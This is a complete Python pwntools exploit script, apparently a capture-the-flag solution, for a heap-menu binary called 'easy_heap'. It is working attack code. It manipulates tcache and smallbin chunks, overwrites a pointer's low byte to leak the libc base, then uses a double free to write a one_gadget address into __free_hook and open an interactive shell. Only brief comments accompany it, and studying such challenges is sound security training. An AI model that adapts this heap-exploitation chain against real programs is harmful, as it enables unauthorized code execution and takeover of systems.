from pwn import *

DEBUG=1

if DEBUG==1:
    context.log_level='debug'

p=process('./easy_heap',env={'LD_PRELOAD':'./libc64.so'})
elf=ELF('./libc64.so')
one_gadget=0x4f322

sd=lambda c: p.send(c)
sl=lambda c: p.sendline(c)
rv=lambda c: p.recvuntil(c)
sa=lambda a,c: p.sendafter(a,c)
sla=lambda a,c: p.sendlineafter(a,c)


def alloc(size,content=''):
    sla('command?\n> ','1')
    sla('size \n> ',str(size))
    sla('content \n> ',content)

def free(index):
    sla('command?\n> ','2')
    sla('index \n> ',str(index))

def show(index):
    sla('command?\n> ','3')
    sla('index \n> ',str(index))

for i in range(10):
    alloc(0xf8) # 0-9
gdb.attach(p)

free(1)
free(2)
free(4)
free(5)
for i in range(7,10):
    free(i)

# these three chunks will be added
# into smallbin double link
free(6)
free(3)
free(0)

for i in range(7):
    alloc(0xf0) # 0-6

alloc(0)     # 7 | rewrite the LSB of fd
alloc(0xf8)  # 8 | rewrite the LSB of fd and next chunk's size

free(0)
free(1)
free(2)
free(3)
free(5)
free(6)

free(4) # trigger here

show(8)
libc_base=u64(p.recv(6)+2*'\x00')-0x3ebca0
log.info('libc base is :'+hex(libc_base))

for i in range(7):
    alloc(0xf0)

alloc(0xf0)

# casually free some chunks to
# avoid alloc to much 
free(1)
free(2)
free(3)

# double free here
free(8)
free(9)

alloc(0xf0,p64(libc_base+elf.symbols['__free_hook']))
alloc(0xf0,p64(libc_base+one_gadget))
alloc(0xf0,p64(libc_base+one_gadget))

free(0)


p.interactive()
